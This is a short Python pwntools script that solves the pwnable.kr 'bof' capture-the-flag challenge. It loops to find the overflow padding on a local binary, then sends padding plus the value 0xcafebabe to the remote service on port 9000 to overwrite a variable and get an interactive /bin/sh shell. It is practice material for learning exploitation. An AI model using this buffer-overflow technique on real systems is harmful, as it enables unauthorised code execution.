from pwn import *


bufferlen = 0
# Make sure ./bof is in the same directory as this
# solution, check local binary for best buffer size
for i in range(0,100):
	print(f"current buffer padding: {i}")
	target = process('bof')
	payload = 'a'*i + '\xbe\xba\xfe\xca'
	target.sendline(payload)
	output = target.recvall(timeout=1)
	print(output)
	if 'Nah' not in str(output):
		bufferlen = i
		break
	target.kill()

print(f"Candidate length: {bufferlen}")

target = remote('pwnable.kr', 9000)
payload = 'a'*(bufferlen) + '\xbe\xba\xfe\xca'
target.send(payload)

# After the target is exploited, the bof program
# will drop us into /bin/sh
# TODO: automatically read flag from `cat flag`
target.interactive()

target.close()